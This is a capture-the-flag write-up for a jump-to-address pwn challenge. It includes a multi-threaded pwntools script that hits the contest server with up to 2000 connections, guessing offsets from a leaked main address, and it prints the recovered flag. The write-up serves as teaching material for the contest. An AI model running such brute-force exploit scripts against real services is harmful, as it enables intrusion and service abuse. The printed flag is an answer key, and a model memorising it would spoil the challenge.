#Pwn 
## Initial Analysis
Connecting to the server:
```bash
nc netrunner.kurukshetraceg.org.in 5021
```
Output:
```
Address of main: 0x5805d5aa934c
Enter the address to jump to, ex => 0x12345: 
```

Since we don't have the binary, we cannot directly see the address of a `win` function. However, we know it's likely located near `main` in the executable segment.

## Strategy: Offset Fuzzing
By leaking the address of `main`, we can calculate potential addresses for a `win` function by applying small offsets. We can automate this by connecting to the server repeatedly and jumping to `main + offset`, where `offset` ranges from -1000 to 1000.

### Exploit Script
I used a multi-threaded Python script to quickly scan the memory space around `main`:

```python
import concurrent.futures
from pwn import *

def attempt(offset_diff):
    context.log_level = 'error'
    try:
        p = remote('netrunner.kurukshetraceg.org.in', 5021, timeout=3)
        p.recvuntil(b"Address of main: ")
        main_addr = int(p.recvline().strip(), 16)
        
        target_addr = main_addr + offset_diff
        
        p.recvuntil(b"Enter the address to jump to, ex => 0x12345: ")
        p.sendline(hex(target_addr).encode())
        
        resp = p.recvall(timeout=0.5)
        if b"CTF" in resp:
            print(f"FOUND IT at offset {offset_diff}: {resp}")
            return True
    except Exception:
        pass
    finally:
        p.close()
    return False

# Scan offsets from -1000 to 1000
offsets = list(range(-1000, 1000))
with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
    for result in executor.map(attempt, offsets):
        if result:
            break
```

## Results
The fuzzer found several offsets that triggered the flag, most notably around **-161**.

**Flag:** `CTF{B!nary_World_!s_hard_skd3w}`
